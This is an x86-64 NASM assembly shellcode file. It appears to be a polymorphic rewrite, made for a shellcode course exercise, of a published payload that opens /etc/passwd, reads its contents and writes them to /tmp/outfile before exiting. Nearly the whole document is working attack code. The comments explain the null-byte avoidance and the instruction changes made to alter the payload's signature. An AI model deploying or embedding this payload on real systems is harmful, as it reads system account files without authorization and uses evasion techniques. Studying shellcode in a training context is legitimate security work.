; Reads data from /etc/passwd to /tmp/outfile
;
; Original Author:	Chris Higgins <chris@chigs.me>
; Original URL:		http://www.shell-storm.org/shellcode/files/shellcode-867.php
; Date:			2014-03-27
;
; Polymorph'd by Gitsnik SLAE64-1232
;
; Original Size: 118 bytes
; Polymorph Size: 96 bytes (81.35% of original)
;
; 7/39 lines same (17.94%)
;
; Chris didn't document much in his code except for a "this is what it does"
; line, so here's the output of my x64-emu.py:
;
; $ x64-emu.py -o polymorph-readwrite.nasm 
; [OPTIMIZER] Register rbx Value less than half, nulls will be in output code
; [+] open() : success rax = 0x04
; [+] read() : success rax = 0x0f
; [OPTIMIZER] Register rbx Value less than half, nulls will be in output code
; [+] open() : success rax = 0x04
; [+] write() : success rax = 0x01
; $
;
; Additionally the lack of exit() cleaning up after itself during testing drove me
; to distraction, so I have tacked it onto the end. Strictly speaking this could
; shave 7 bytes off my code, but I'm leaving it there to make a point.
;
bits 64

global _start

section .text

_start:

	xor rcx, rcx
	mul rcx

	push rcx
	pop rsi		; Ensure RSI is null

	;
	; open()
	;

	;
	; Save /etc//passwd to stack and load its address into
	; rdi
	;
	; Again, cheating a bit here and not xor'ing the strings
	; so they are actually very close. Using different registers
	; though.
	;
	mov ecx, 0x64777373
	push rcx
	mov rcx, 0x61702f2f6374652f
	push rcx

	;
	; Arguments: 	RAX = 0x02 = open()
	; 		RDI = RSP = */etc//passwd
	;		RSI = 0x00
	;
	add al, 0x02

	push rsp
	pop rdi

	syscall		; same

	;
	; read( fd, buf, size )
	;
	; rax contains fd, rdi is currently a stack pointer,
	; rsi is null, rdx is null courtesy our mul rcx
	;
	xchg rax, rdi	; rdi contains fd now, rax we don't care for.
	push rdx
	pop rax		; null - read(0)

	push rsp
	pop rsi		; just point at the stack for read()
	
	add dx, 0xffff	; how much to read.
	syscall		; same

	;
	; open( path, flags, mode )
	; rax contains number of bytes read from read()
	; which is irrelevant to us here but we may need later on.
	;
	; RDX is 0xffff, RSI is a stack pointer we care about (later), RDI is our read(fd) and
	; is not used in this shellcode.
	;
	mov r8, rax		; same. read size in r8 for later.
	mov r9, rsi		; save rsi pointer (*buf) for later.

	mov eax, 0x656c6966	; we use eax because we know everything but ax
				; is null. Just re-using what we have courtesy our bytes read()
	push rax
	mov rax, 0x74756f2f706d742f	;not changing the string.
	push rax

	push byte 0x02
	pop rax

	push rsp
	pop rdi

	push byte 0x66	; same
	pop rsi	
	syscall		; same

	;
	; write()
	;
	xchg rdi, rax		; rdi contains the write(fd)
	push byte 0x01
	pop rax			; write syscall id

	lea rsi, [r9]
	mov rdx, r8		; same
	syscall			; same

	;
	; Putting in an exit() because it's frustrating me
	;
	xchg rdi, rax		; might as well exit() with the number of bytes
	push byte 0x3c
	pop rax
	syscall
